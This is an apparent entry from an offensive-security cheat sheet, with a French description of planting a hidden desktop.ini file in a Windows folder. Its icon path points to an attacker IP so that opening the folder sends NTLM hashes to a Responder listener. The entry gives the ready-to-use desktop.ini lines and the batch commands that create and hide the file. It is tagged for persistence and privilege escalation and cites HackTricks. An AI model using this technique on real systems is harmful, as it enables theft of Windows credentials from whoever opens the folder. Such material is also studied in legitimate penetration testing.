---
description: |
  Les fichiers desktop.ini contiennent les informations relatives aux icônes que vous avez appliquées au dossier. Nous pouvons utiliser ces informations pour résoudre un chemin d'accès au réseau. Une fois le dossier ouvert, vous devriez obtenir les hachages. Assurez-vous que Responder fonctionne sur l'adresse IP de l'attaquant.

  Command Reference:

    Attacker IP: 10.10.14.4

command: |
  [.ShellClassInfo]
  IconFile=\\10.10.14.4\maus

code: |
  mkdir openMe
  attrib +s openMe
  cd openMe
  echo [.ShellClassInfo] > desktop.ini
  echo IconResource=\\192.168.0.1\aa >> desktop.ini
  attrib +s +h desktop.ini

items:
  - Shell
  - No_creds
services:
  -
OS:
  - Windows
  - Approved-tool
attack_types:
  - Persistence
  - PrivEsc
references:
  - https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini
---